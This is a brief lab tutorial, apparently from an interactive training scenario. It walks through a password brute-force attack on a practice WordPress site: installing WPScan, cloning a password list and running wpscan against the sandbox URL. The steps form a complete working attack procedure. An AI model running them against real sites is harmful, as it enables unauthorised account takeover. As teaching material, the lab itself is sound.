## **Introduction Brute-Force Attack**
---

## **What is Brute-force attack?**
```
Brute-force attack means the attacker submits a huge number of passwords or usernames to guess the username and password correctly. 
```
### Now let try to enforce the brute-force attack to the WordPress website we have just created.
<br></br>
## Step 1:
### Download the WPscan using the command:

```sh
gem install wpscan{{execute}}
```
<br></br>
## Step 2:
### Clone the crack.txt file which includes a list of password from Github using the command:
```sh
git clone https://github.com/tonywong586/CrackList.git{{execute}}
```
<br></br>
## Step 3:
### Use the following command to enforce the Brute-force attack
```sh
wpscan --url https://2886795313-8000-simba11.environments.katacoda.com/ --passwords crack.txt{{execute}}
```